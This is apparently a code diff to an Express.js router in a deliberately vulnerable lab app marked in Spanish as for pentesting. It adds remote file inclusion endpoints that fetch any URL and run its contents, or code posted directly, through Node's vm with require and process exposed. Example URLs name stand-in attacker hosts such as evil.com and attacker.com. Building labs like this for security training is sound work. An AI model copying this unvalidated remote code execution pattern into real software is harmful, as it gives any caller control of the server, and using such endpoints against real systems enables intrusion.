@@ -1,11 +1,13 @@
 const express = require('express');
 const path = require('path');
 const fs = require('fs');
+const axios = require('axios');
+const vm = require('vm');
 
 const router = express.Router();
 
 // ============================================
-// VULNERABILIDADES DE PATH TRAVERSAL
+// VULNERABILIDADES DE PATH TRAVERSAL + RFI
 // Solo para pruebas de pentesting en puerto 6969
 // ============================================
 
@@ -276,9 +278,137 @@ router.get('/info', (req, res) => {
                     '/api/files/list?dir=../../',
                     '/api/files/list?dir=../../../'
                 ]
+            },
+            rfi: {
+                method: 'GET',
+                path: '/api/files/include?url=<remote_url>',
+                description: 'Remote File Inclusion - Incluye y ejecuta archivos remotos',
+                examples: [
+                    '/api/files/include?url=http://evil.com/malicious.js',
+                    '/api/files/include?url=http://attacker.com/shell.txt'
+                ]
             }
         }
     });
+});
+
+// ============================================
+// RFI - REMOTE FILE INCLUSION
+// ============================================
+
+// @route   GET /api/files/include
+// @desc    Incluye un archivo remoto (VULNERABLE A RFI)
+// @access  Public (VULNERABLE)
+router.get('/include', async (req, res) => {
+    const { url } = req.query;
+    
+    if (!url) {
+        return res.status(400).json({ 
+            message: 'Parámetro "url" requerido',
+            hint: 'Usa ?url=http://ejemplo.com/archivo.txt',
+            vulnerability: 'Remote File Inclusion (RFI)',
+            examples: [
+                '/api/files/include?url=http://evil.com/payload.js',
+                '/api/files/include?url=https://raw.githubusercontent.com/user/repo/file.txt'
+            ]
+        });
+    }
+
+    console.log(`[RFI VULNERABLE] Intentando incluir archivo remoto: ${url}`);
+
+    try {
+        // VULNERABLE: Request a URL sin validación
+        const response = await axios.get(url, { timeout: 5000 });
+        const content = typeof response.data === 'string' ? response.data : JSON.stringify(response.data);
+        
+        // VULNERABLE: Intentar ejecutar si parece JavaScript
+        let executed = null;
+        if (url.endsWith('.js') || req.query.exec === 'true') {
+            try {
+                // VULNERABLE: Ejecución de código remoto
+                const context = vm.createContext({ 
+                    require, 
+                    console, 
+                    process,
+                    Buffer,
+                    setTimeout,
+                    setInterval,
+                    result: null
+                });
+                vm.runInContext(content, context);
+                executed = context.result || 'Código ejecutado (sin resultado explícito)';
+            } catch (execError) {
+                executed = `Error de ejecución: ${execError.message}`;
+            }
+        }
+
+        res.json({
+            success: true,
+            url: url,
+            content: content,
+            length: content.length,
+            executed: executed,
+            warning: '⚠️ VULNERABLE: Remote File Inclusion activo'
+        });
+
+    } catch (error) {
+        console.error('[RFI] Error:', error.message);
+        res.status(500).json({ 
+            message: 'Error al incluir archivo remoto',
+            error: error.message 
+        });
+    }
+});
+
+// @route   POST /api/files/include
+// @desc    Incluye y ejecuta código remoto via POST (VULNERABLE A RFI)
+// @access  Public (VULNERABLE)
+router.post('/include', async (req, res) => {
+    const { url, code } = req.body;
+    
+    console.log(`[RFI VULNERABLE] POST - URL: ${url}, Code length: ${code?.length || 0}`);
+
+    try {
+        let content = code;
+        
+        // Si se proporciona URL, obtener contenido remoto
+        if (url) {
+            const response = await axios.get(url, { timeout: 5000 });
+            content = typeof response.data === 'string' ? response.data : JSON.stringify(response.data);
+        }
+
+        if (!content) {
+            return res.status(400).json({ 
+                message: 'Se requiere "url" o "code" en el body' 
+            });
+        }
+
+        // VULNERABLE: Ejecución directa de código
+        const context = vm.createContext({ 
+            require, 
+            console, 
+            process,
+            Buffer,
+            setTimeout,
+            setInterval,
+            axios,
+            result: null
+        });
+        
+        vm.runInContext(content, context);
+
+        res.json({
+            success: true,
+            executed: true,
+            result: context.result,
+        });
+
+    } catch (error) {
+        res.status(500).json({ 
+            message: 'Error al ejecutar código',
+            error: error.message 
+        });
+    }
 });
 
 module.exports = router;
